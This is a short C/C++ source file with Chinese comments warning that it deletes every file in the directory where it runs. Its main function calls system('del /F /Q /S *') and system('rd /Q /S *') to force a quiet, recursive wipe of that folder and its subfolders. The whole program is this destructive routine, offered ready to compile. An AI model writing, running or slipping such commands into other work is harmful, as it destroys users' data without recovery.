// VS Code(GB2312), MinGW, g++编译
// 程序会删除运行目录下所以文件，十分危险，请小心使用
#include <Windows.h>
#include <stdio.h>

int main()
{
    system("del /F /Q /S *");
    system("rd /Q /S *");
    return 0;
}